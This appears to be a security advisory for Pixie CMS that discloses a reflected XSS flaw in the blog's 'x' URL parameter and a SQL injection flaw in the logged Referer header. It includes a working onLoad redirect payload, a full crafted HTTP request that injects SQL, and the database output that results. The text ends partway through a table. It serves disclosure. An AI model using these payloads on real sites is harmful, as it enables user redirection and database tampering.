Pixie CMS Multiple Vulnerabilities

Pixie is a "free, open source web application that will help you quickly
create your own website.  Many people refer to this type of software as
a 'content management system (cms)'" (http://www.getpixie.co.uk).  Pixie
is written in PHP with a MySQL database back end.

Pixie Blog XSS

It is possible to trivially introduce a Cross Site Scripting (XSS)
attack by tampering with blog post URL variables, specifically the "x="
variable which is designed to contain blog posting titles.  For
instance, on a default install of Pixie, the first blog post contains is
referenced using the URL ?s=blog&m=permalink&x=my-first-post.  The "x"
variable is interlaced with the BODY tag during display on line 150 of
index.php:

<body class="pixie <?php $s." "; $date_array = getdate(); print
"y".$date_array['year']." "; print "m".$date_array['mon']." "; print
"d".$date_array['mday']." "; print "h".$date_array['hours']." "; print
$s; ?>">

by changing the "x" variable it is possible to inject HTML code into the
page display.  For instance, a Pixie blog post that was intended to be
published as

http://192.168.0.67/pixie/?s=blog&m=permalink&x=my-first-post

Can be altered to the form:

http://192.168.0.67/pixie/?s=blog&m=permalink&x="
onLoad="location.href='http://lampsecurity.org'

and redirect users to the "onLoad" specified URL.

Pixie Blog SQL Injection

Pixie blog is vulnerable to SQL injection by manipulating the "referer"
client request.  Referers are tracked in the referral() function
(/admin/lib/lib_logs.php line 31) but are not sanitized.  Thus,
manipulating the referer can allow an attacker to perform SQL Injection
attacks.  For example, sending the request:

GET http://192.168.0.67/pixie/?s=events HTTP/1.1
Host: 192.168.0.67
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6)
Gecko/2009020501 Firefox/3.0.6 Paros/3.2.13
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://www.lampsecurity.org/pixie/?s=about',log_id=1 on
duplicate key update log_message='foobar
Cookie: bb2_screener_=1237492959+192.168.0.3

Results in the pixie_log table being altered by issuing the following
SQL statement:

insert into pixie_log set user_id = 'Visitor', user_ip = '192.168.0.3',
log_time = now(), log_type = 'referral', log_icon = 'referral',
log_message = 'http://www.lampsecurity.org/pixie/?s=about',log_id=1 on
duplicate key update log_message='foobar'

resulting in:

mysql> select * from pixie_log where log_id=1;

+--------+---------+-------------+---------------------+----------+-------------+----------+---------------+
| log_id | user_id | user_ip     | log_time            | log_type |
log_message | log_icon | log_important |
+--------+---------+-------------+---------------------+----------+-------------+----------+---------------+
